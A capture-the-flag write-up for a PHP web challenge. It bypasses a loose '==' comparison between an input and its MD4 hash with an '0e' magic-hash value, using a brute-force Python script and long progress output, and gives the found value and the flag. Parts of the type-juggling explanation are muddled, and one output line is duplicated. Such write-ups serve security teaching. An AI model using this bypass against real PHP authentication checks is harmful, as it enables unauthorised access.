## MD5--
### Category : Web

---
```
md5-- == md4

```

After visiting the given link, we get to see the source of `index.php` 

```
<?php
$flag = file_get_contents("/flag");

if (!isset($_GET["md4"]))
{
    highlight_file(__FILE__);
    die();
}

if ($_GET["md4"] == hash("md4", $_GET["md4"]))
{
    echo $flag;
}
else
{
    echo "bad";
}
?>
```

We need to find whose md4 hash "equals" the value of itself. Now since `==` is used instead of `===`, it's a loose comparison. In Loose comparison, whencomparing a string to a number, PHP will attempt to convert the string to a number then perform a numeric comparison. Sounds good, doesn't work. for example,  
```
0e12 == int(0) => True
```

`e` refers to an exponential in a decimal number, but also refers to `14`, when the string is supposed to be a hexadecimal number. Now, this is where we take advantage of the vulnerability. `md4(<some number>)`, will return a hexadecimal string, of the decimal value of `<some number>`. 
The easiest way to do this is to provide a number starting with 0e, which MD4 hash begins with 0e as well and contains only numbers.

A simple bruteforce does the trick.

`exploit.py`
```
import hashlib
import re

prefix = '0e'

def breakit():
    iters = 0
    while 1:
        s = prefix + str(iters)
        h = hashlib.new("md4")
        h.update(s.encode())
        hashed_s = h.hexdigest()
        iters = iters + 1
        r = re.match('^0e[0-9]{30}', hashed_s)
        if r:
            print ("[+] found! md4( {} ) ---> {}".format(s, hashed_s))
            print ("[+] in {} iterations".format(iters))
            exit(0)

        if iters % 1000000 == 0:
            print ("[+] current value: {}       {} iterations, continue...".format(s, iters))

breakit()
```

output
```
[+] current value: 0e999999       1000000 iterations, continue...
[+] current value: 0e1999999       2000000 iterations, continue...
[+] current value: 0e2999999       3000000 iterations, continue...
[+] current value: 0e3999999       4000000 iterations, continue...
[+] current value: 0e4999999       5000000 iterations, continue...
[+] current value: 0e5999999       6000000 iterations, continue...
[+] current value: 0e6999999       7000000 iterations, continue...
[+] current value: 0e7999999       8000000 iterations, continue...
[+] current value: 0e8999999       9000000 iterations, continue...
[+] current value: 0e9999999       10000000 iterations, continue...
[+] current value: 0e10999999       11000000 iterations, continue...
[+] current value: 0e11999999       12000000 iterations, continue...
[+] current value: 0e12999999       13000000 iterations, continue...
[+] current value: 0e13999999       14000000 iterations, continue...
[+] current value: 0e14999999       15000000 iterations, continue...
[+] current value: 0e15999999       16000000 iterations, continue...
[+] current value: 0e16999999       17000000 iterations, continue...
[+] current value: 0e17999999       18000000 iterations, continue...
[+] current value: 0e18999999       19000000 iterations, continue...
[+] current value: 0e19999999       20000000 iterations, continue...
[+] current value: 0e20999999       21000000 iterations, continue...
[+] current value: 0e21999999       22000000 iterations, continue...
[+] current value: 0e22999999       23000000 iterations, continue...
[+] current value: 0e23999999       24000000 iterations, continue...
[+] current value: 0e24999999       25000000 iterations, continue...
[+] current value: 0e25999999       26000000 iterations, continue...
[+] current value: 0e26999999       27000000 iterations, continue...
[+] current value: 0e27999999       28000000 iterations, continue...
[+] current value: 0e28999999       29000000 iterations, continue...
[+] current value: 0e29999999       30000000 iterations, continue...
[+] current value: 0e30999999       31000000 iterations, continue...
[+] current value: 0e31999999       32000000 iterations, continue...
[+] current value: 0e32999999       33000000 iterations, continue...
[+] current value: 0e33999999       34000000 iterations, continue...
[+] current value: 0e34999999       35000000 iterations, continue...
[+] current value: 0e35999999       36000000 iterations, continue...
[+] current value: 0e36999999       37000000 iterations, continue...
[+] current value: 0e37999999       38000000 iterations, continue...
[+] current value: 0e38999999       39000000 iterations, continue...
[+] current value: 0e39999999       40000000 iterations, continue...
[+] current value: 0e40999999       41000000 iterations, continue...
[+] current value: 0e41999999       42000000 iterations, continue...
[+] current value: 0e42999999       43000000 iterations, continue...
[+] current value: 0e43999999       44000000 iterations, continue...
[+] current value: 0e44999999       45000000 iterations, continue...
[+] current value: 0e45999999       46000000 iterations, continue...
[+] current value: 0e46999999       47000000 iterations, continue...
[+] current value: 0e47999999       48000000 iterations, continue...
[+] current value: 0e48999999       49000000 iterations, continue...
[+] current value: 0e49999999       50000000 iterations, continue...
[+] current value: 0e50999999       51000000 iterations, continue...
[+] current value: 0e51999999       52000000 iterations, continue...
[+] current value: 0e52999999       53000000 iterations, continue...
[+] current value: 0e53999999       54000000 iterations, continue...
[+] current value: 0e54999999       55000000 iterations, continue...
[+] current value: 0e55999999       56000000 iterations, continue...
[+] current value: 0e56999999       57000000 iterations, continue...
[+] current value: 0e57999999       58000000 iterations, continue...
[+] current value: 0e58999999       59000000 iterations, continue...
[+] current value: 0e59999999       60000000 iterations, continue...
[+] current value: 0e60999999       61000000 iterations, continue...
[+] current value: 0e61999999       62000000 iterations, continue...
[+] current value: 0e62999999       63000000 iterations, continue...
[+] current value: 0e63999999       64000000 iterations, continue...
[+] current value: 0e64999999       65000000 iterations, continue...
[+] current value: 0e65999999       66000000 iterations, continue...
[+] current value: 0e66999999       67000000 iterations, continue...
[+] current value: 0e67999999       68000000 iterations, continue...
[+] current value: 0e68999999       69000000 iterations, continue...
[+] current value: 0e69999999       70000000 iterations, continue...
[+] current value: 0e70999999       71000000 iterations, continue...
[+] current value: 0e71999999       72000000 iterations, continue...
[+] current value: 0e72999999       73000000 iterations, continue...
[+] current value: 0e73999999       74000000 iterations, continue...
[+] current value: 0e74999999       75000000 iterations, continue...
[+] current value: 0e75999999       76000000 iterations, continue...
[+] current value: 0e76999999       77000000 iterations, continue...
[+] current value: 0e77999999       78000000 iterations, continue...
[+] current value: 0e78999999       79000000 iterations, continue...
[+] current value: 0e79999999       80000000 iterations, continue...
[+] current value: 0e80999999       81000000 iterations, continue...
[+] current value: 0e81999999       82000000 iterations, continue...
[+] current value: 0e82999999       83000000 iterations, continue...
[+] current value: 0e83999999       84000000 iterations, continue...
[+] current value: 0e84999999       85000000 iterations, continue...
[+] current value: 0e85999999       86000000 iterations, continue...
[+] current value: 0e86999999       87000000 iterations, continue...
[+] current value: 0e87999999       88000000 iterations, continue...
[+] current value: 0e88999999       89000000 iterations, continue...
[+] current value: 0e89999999       90000000 iterations, continue...
[+] current value: 0e90999999       91000000 iterations, continue...
[+] current value: 0e91999999       92000000 iterations, continue...
[+] current value: 0e92999999       93000000 iterations, continue...
[+] current value: 0e93999999       94000000 iterations, continue...
[+] current value: 0e94999999       95000000 iterations, continue...
[+] current value: 0e95999999       96000000 iterations, continue...
[+] current value: 0e96999999       97000000 iterations, continue...
[+] current value: 0e97999999       98000000 iterations, continue...
[+] current value: 0e98999999       99000000 iterations, continue...
[+] current value: 0e99999999       100000000 iterations, continue...
[+] current value: 0e100999999       101000000 iterations, continue...
[+] current value: 0e101999999       102000000 iterations, continue...
[+] current value: 0e102999999       103000000 iterations, continue...
[+] current value: 0e103999999       104000000 iterations, continue...
[+] current value: 0e104999999       105000000 iterations, continue...
[+] current value: 0e105999999       106000000 iterations, continue...
[+] current value: 0e106999999       107000000 iterations, continue...
[+] current value: 0e107999999       108000000 iterations, continue...
[+] current value: 0e108999999       109000000 iterations, continue...
[+] current value: 0e109999999       110000000 iterations, continue...
[+] current value: 0e110999999       111000000 iterations, continue...
[+] current value: 0e111999999       112000000 iterations, continue...
[+] current value: 0e112999999       113000000 iterations, continue...
[+] current value: 0e113999999       114000000 iterations, continue...
[+] current value: 0e114999999       115000000 iterations, continue...
[+] current value: 0e115999999       116000000 iterations, continue...
[+] current value: 0e116999999       117000000 iterations, continue...
[+] current value: 0e117999999       118000000 iterations, continue...
[+] current value: 0e118999999       119000000 iterations, continue...
[+] current value: 0e119999999       120000000 iterations, continue...
[+] current value: 0e120999999       121000000 iterations, continue...
[+] current value: 0e121999999       122000000 iterations, continue...
[+] current value: 0e122999999       123000000 iterations, continue...
[+] current value: 0e123999999       124000000 iterations, continue...
[+] current value: 0e124999999       125000000 iterations, continue...
[+] current value: 0e125999999       126000000 iterations, continue...
[+] current value: 0e126999999       127000000 iterations, continue...
[+] current value: 0e127999999       128000000 iterations, continue...
[+] current value: 0e128999999       129000000 iterations, continue...
[+] current value: 0e129999999       130000000 iterations, continue...
[+] current value: 0e130999999       131000000 iterations, continue...
[+] current value: 0e131999999       132000000 iterations, continue...
[+] current value: 0e132999999       133000000 iterations, continue...
[+] current value: 0e133999999       134000000 iterations, continue...
[+] current value: 0e134999999       135000000 iterations, continue...
[+] current value: 0e135999999       136000000 iterations, continue...
[+] current value: 0e136999999       137000000 iterations, continue...
[+] current value: 0e137999999       138000000 iterations, continue...
[+] current value: 0e138999999       139000000 iterations, continue...
[+] current value: 0e139999999       140000000 iterations, continue...
[+] current value: 0e140999999       141000000 iterations, continue...
[+] current value: 0e141999999       142000000 iterations, continue...
[+] current value: 0e142999999       143000000 iterations, continue...
[+] current value: 0e143999999       144000000 iterations, continue...
[+] current value: 0e144999999       145000000 iterations, continue...
[+] current value: 0e145999999       146000000 iterations, continue...
[+] current value: 0e146999999       147000000 iterations, continue...
[+] current value: 0e147999999       148000000 iterations, continue...
[+] current value: 0e148999999       149000000 iterations, continue...
[+] current value: 0e149999999       150000000 iterations, continue...
[+] current value: 0e150999999       151000000 iterations, continue...
[+] current value: 0e151999999       152000000 iterations, continue...
[+] current value: 0e152999999       153000000 iterations, continue...
[+] current value: 0e153999999       154000000 iterations, continue...
[+] current value: 0e154999999       155000000 iterations, continue...
[+] current value: 0e155999999       156000000 iterations, continue...
[+] current value: 0e156999999       157000000 iterations, continue...
[+] current value: 0e157999999       158000000 iterations, continue...
[+] current value: 0e158999999       159000000 iterations, continue...
[+] current value: 0e159999999       160000000 iterations, continue...
[+] current value: 0e160999999       161000000 iterations, continue...
[+] current value: 0e161999999       162000000 iterations, continue...
[+] current value: 0e162999999       163000000 iterations, continue...
[+] current value: 0e163999999       164000000 iterations, continue...
[+] current value: 0e164999999       165000000 iterations, continue...
[+] current value: 0e165999999       166000000 iterations, continue...
[+] current value: 0e166999999       167000000 iterations, continue...
[+] current value: 0e167999999       168000000 iterations, continue...
[+] current value: 0e168999999       169000000 iterations, continue...
[+] current value: 0e169999999       170000000 iterations, continue...
[+] current value: 0e170999999       171000000 iterations, continue...
[+] current value: 0e171999999       172000000 iterations, continue...
[+] current value: 0e172999999       173000000 iterations, continue...
[+] current value: 0e173999999       174000000 iterations, continue...
[+] current value: 0e174999999       175000000 iterations, continue...
[+] current value: 0e175999999       176000000 iterations, continue...
[+] current value: 0e176999999       177000000 iterations, continue...
[+] current value: 0e177999999       178000000 iterations, continue...
[+] current value: 0e178999999       179000000 iterations, continue...
[+] current value: 0e179999999       180000000 iterations, continue...
[+] current value: 0e180999999       181000000 iterations, continue...
[+] current value: 0e181999999       182000000 iterations, continue...
[+] current value: 0e182999999       183000000 iterations, continue...
[+] current value: 0e183999999       184000000 iterations, continue...
[+] current value: 0e184999999       185000000 iterations, continue...
[+] current value: 0e185999999       186000000 iterations, continue...
[+] current value: 0e186999999       187000000 iterations, continue...
[+] current value: 0e187999999       188000000 iterations, continue...
[+] current value: 0e188999999       189000000 iterations, continue...
[+] current value: 0e189999999       190000000 iterations, continue...
[+] current value: 0e190999999       191000000 iterations, continue...
[+] current value: 0e191999999       192000000 iterations, continue...
[+] current value: 0e192999999       193000000 iterations, continue...
[+] current value: 0e193999999       194000000 iterations, continue...
[+] current value: 0e194999999       195000000 iterations, continue...
[+] current value: 0e195999999       196000000 iterations, continue...
[+] current value: 0e196999999       197000000 iterations, continue...
[+] current value: 0e197999999       198000000 iterations, continue...
[+] current value: 0e198999999       199000000 iterations, continue...
[+] current value: 0e199999999       200000000 iterations, continue...
[+] current value: 0e200999999       201000000 iterations, continue...
[+] current value: 0e201999999       202000000 iterations, continue...
[+] current value: 0e202999999       203000000 iterations, continue...
[+] current value: 0e203999999       204000000 iterations, continue...
[+] current value: 0e204999999       205000000 iterations, continue...
[+] current value: 0e205999999       206000000 iterations, continue...
[+] current value: 0e206999999       207000000 iterations, continue...
[+] current value: 0e207999999       208000000 iterations, continue...
[+] current value: 0e208999999       209000000 iterations, continue...
[+] current value: 0e209999999       210000000 iterations, continue...
[+] current value: 0e210999999       211000000 iterations, continue...
[+] current value: 0e210999999       211000000 iterations, continue...
[+] current value: 0e211999999       212000000 iterations, continue...
[+] current value: 0e212999999       213000000 iterations, continue...
[+] current value: 0e213999999       214000000 iterations, continue...
[+] current value: 0e214999999       215000000 iterations, continue...
[+] current value: 0e215999999       216000000 iterations, continue...
[+] current value: 0e216999999       217000000 iterations, continue...
[+] current value: 0e217999999       218000000 iterations, continue...
[+] current value: 0e218999999       219000000 iterations, continue...
[+] current value: 0e219999999       220000000 iterations, continue...
[+] current value: 0e220999999       221000000 iterations, continue...
[+] current value: 0e221999999       222000000 iterations, continue...
[+] current value: 0e222999999       223000000 iterations, continue...
[+] current value: 0e223999999       224000000 iterations, continue...
[+] current value: 0e224999999       225000000 iterations, continue...
[+] current value: 0e225999999       226000000 iterations, continue...
[+] current value: 0e226999999       227000000 iterations, continue...
[+] current value: 0e227999999       228000000 iterations, continue...
[+] current value: 0e228999999       229000000 iterations, continue...
[+] current value: 0e229999999       230000000 iterations, continue...
[+] current value: 0e230999999       231000000 iterations, continue...
[+] current value: 0e231999999       232000000 iterations, continue...
[+] current value: 0e232999999       233000000 iterations, continue...
[+] current value: 0e233999999       234000000 iterations, continue...
[+] current value: 0e234999999       235000000 iterations, continue...
[+] current value: 0e235999999       236000000 iterations, continue...
[+] current value: 0e236999999       237000000 iterations, continue...
[+] current value: 0e237999999       238000000 iterations, continue...
[+] current value: 0e238999999       239000000 iterations, continue...
[+] current value: 0e239999999       240000000 iterations, continue...
[+] current value: 0e240999999       241000000 iterations, continue...
[+] current value: 0e241999999       242000000 iterations, continue...
[+] current value: 0e242999999       243000000 iterations, continue...
[+] current value: 0e243999999       244000000 iterations, continue...
[+] current value: 0e244999999       245000000 iterations, continue...
[+] current value: 0e245999999       246000000 iterations, continue...
[+] current value: 0e246999999       247000000 iterations, continue...
[+] current value: 0e247999999       248000000 iterations, continue...
[+] current value: 0e248999999       249000000 iterations, continue...
[+] current value: 0e249999999       250000000 iterations, continue...
[+] current value: 0e250999999       251000000 iterations, continue...
[+] found! md4( 0e251288019 ) ---> 0e874956163641961271069404332409
[+] in 251288020 iterations

```

Took roughly 5-7 mins to get the hash.
On inputting the value, we get the flag
```
FLAG : hsctf{php_type_juggling_is_fun}
```